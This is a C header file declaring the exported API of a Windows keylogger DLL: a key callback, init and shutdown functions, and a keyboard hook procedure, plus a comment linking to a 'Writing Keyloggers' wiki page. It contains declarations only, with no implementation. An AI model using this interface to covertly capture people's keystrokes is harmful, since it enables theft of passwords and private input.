#ifndef __MAIN_H__
#define __MAIN_H__

#include <windows.h>
#include "../../shared/include/Keylogger_Constants.h"

#ifdef BUILD_DLL
    #define DLL_EXPORT __declspec(dllexport)
#else
    #define DLL_EXPORT __declspec(dllimport)
#endif

#ifdef __cplusplus
extern "C"
{
#endif

// interesting: http://www.docdroppers.org/wiki/index.php?title=Writing_Keyloggers

typedef void(*keylogger_callback)(int key, int modifier);

// ------------------------------------
// pass in the callback which receives the logged key
DLL_EXPORT void keylogger_set_callback(keylogger_callback cb);
DLL_EXPORT void keylogger_init(HINSTANCE h);
DLL_EXPORT void keylogger_shutdown();

// gets called when a key event is fired.
DLL_EXPORT LRESULT CALLBACK keylogger_hook_callback(
	 int ncode
	,WPARAM wparam
	,LPARAM lparam
);

#ifdef __cplusplus
}

#endif
#endif // __MAIN_H__
